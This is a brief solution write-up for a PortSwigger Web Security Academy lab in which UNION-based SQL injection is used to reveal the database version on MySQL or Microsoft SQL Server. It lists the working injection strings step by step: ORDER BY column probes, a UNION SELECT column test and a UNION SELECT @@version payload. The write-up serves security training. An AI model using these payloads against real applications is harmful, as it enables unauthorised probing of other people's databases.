Lab 4: SQL Injection - Query Database Version on MySQL and Microsoft
Platform: PortSwigger Web Security Academy
Level: Practitioner
Category: SQL Injection - Examining the Database
Status: ✅ Solved

Objective
Retrieve the database type and version on a MySQL or Microsoft SQL Server using UNION-based SQL injection.

Key Concept
On MySQL/Microsoft, comments are written as -- (with a space after) or #. The version variable is @@version.

Steps to Solve

Found the injectable category parameter
Determined number of columns:

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (error = 2 columns)

Found string-compatible column:

' UNION SELECT 'a',NULL-- -

Injected version payload:

' UNION SELECT @@version,NULL-- -

MySQL/Microsoft version string displayed on page ✅


